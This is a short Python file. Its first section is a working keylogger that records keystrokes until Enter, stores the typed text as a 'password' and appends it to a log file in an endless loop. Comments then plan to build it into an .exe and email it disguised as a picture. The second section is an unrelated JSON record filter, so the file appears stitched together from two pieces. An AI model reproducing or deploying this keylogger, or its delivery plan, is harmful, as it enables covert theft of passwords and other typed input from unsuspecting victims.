# ===================================================== Basic keylogger ================================================

import keyboard

# Defining the text file name and path
path = "keysniffer_data.txt"

while True:
    with open(path, "a") as data_file:

        # All key presses are recorded as a list into "events"
        # and the record loop stops when the "enter" key is pressed
        events = keyboard.record("enter")
        password = list(keyboard.get_typed_strings(events))

        data_file.write("\n")  # New line written before data is written
        data_file.write(password[0])


# .exe file to execure
# mail it with picture
# ...

# ===================================================== Filtering data =======================================================

import json
import os


def filter_data(data, criteria):
    return [item for item in data if all(item.get(k) == v for k, v in criteria.items())]


def read_data_from_file(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File {file_path} not found.")
    with open(file_path, "r") as file:
        return [json.loads(line) for line in file]


def save_data_to_file(data, file_path):
    with open(file_path, "w") as file:
        file.writelines(json.dumps(item) + "\n" for item in data)


# Paths
data_file_path = "data.txt"
output_file_path = "filtered_results.txt"

# Filter and save
example_data = read_data_from_file(data_file_path)
criteria = {"age": 30, "city": "New York"}
filtered_results = filter_data(example_data, criteria)
save_data_to_file(filtered_results, output_file_path)

print(f"Filtered results saved to {output_file_path}")
